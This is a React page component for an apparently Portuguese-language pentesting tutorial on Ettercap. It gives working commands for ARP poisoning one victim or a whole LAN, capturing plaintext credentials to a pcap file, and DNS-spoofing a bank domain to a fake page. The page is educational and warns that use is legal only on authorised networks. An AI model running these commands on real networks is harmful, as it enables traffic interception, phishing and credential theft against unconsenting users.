import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function Ettercap() {
    return (
      <PageContainer
        title="Ettercap — MITM e Sniffing"
        subtitle="Ferramenta completa de sniffing, MITM e análise de protocolos em redes locais."
        difficulty="avancado"
        timeToRead="10 min"
      >
        <AlertBox type="danger" title="Use apenas em redes autorizadas">
          Ettercap captura tráfego de terceiros na rede. Uso não autorizado é crime.
        </AlertBox>

        <h2>Instalação</h2>
        <CodeBlock language="bash" code={'sudo apt install ettercap-graphical ettercap-common -y\n\n# GUI\nsudo ettercap -G\n\n# CLI\nsudo ettercap -T -q -i eth0'} />

        <h2>ARP Poisoning com Ettercap</h2>
        <CodeBlock language="bash" code={'# Habilitar IP forwarding\necho 1 > /proc/sys/net/ipv4/ip_forward\n\n# ARP spoofing entre vítima e gateway\nsudo ettercap -T -M arp:remote -i eth0 /192.168.1.100// /192.168.1.1//\n\n# Envenenar TODOS os hosts da rede\nsudo ettercap -T -M arp -i eth0 // //\n\n# Com plugin (p para listar plugins)\n# dns_spoof    — spoof de DNS\n# sslstrip     — remover SSL\n# chk_poison   — verificar se envenenamento funcionou'} />

        <h2>Captura de Credenciais</h2>
        <CodeBlock language="bash" code={'# Ettercap captura automaticamente credenciais de:\n# HTTP, FTP, Telnet, POP3, IMAP, SMTP\n# Dependendo da configuração do etter.conf\n\n# Plugins de captura\nsudo ettercap -T -M arp -i eth0 // // -P autoadd\n\n# Ver credenciais capturadas\n# No modo GUI: View → Connections\n# No CLI: saem automaticamente no terminal\n\n# Salvar captura\nsudo ettercap -T -M arp -i eth0 // // -w /tmp/captura.pcap\n\n# Analisar no Wireshark\nwireshark /tmp/captura.pcap'} />

        <h2>DNS Spoofing com Ettercap</h2>
        <CodeBlock language="bash" code={'# Editar arquivo de hosts do ettercap\nnano /etc/ettercap/etter.dns\n# Adicionar:\n# banco.com.br       A   192.168.1.50  (IP da página falsa)\n# www.banco.com.br   A   192.168.1.50\n\n# Iniciar com plugin dns_spoof\nsudo ettercap -T -M arp -i eth0 // // -P dns_spoof'} />

        <AlertBox type="success" title="Bettercap é o sucessor moderno">
          Bettercap oferece as mesmas funcionalidades do Ettercap com interface mais moderna,
          melhor suporte a IPv6 e uma API REST para automação. Para novos projetos, prefira Bettercap.
        </AlertBox>
      </PageContainer>
    );
  }
  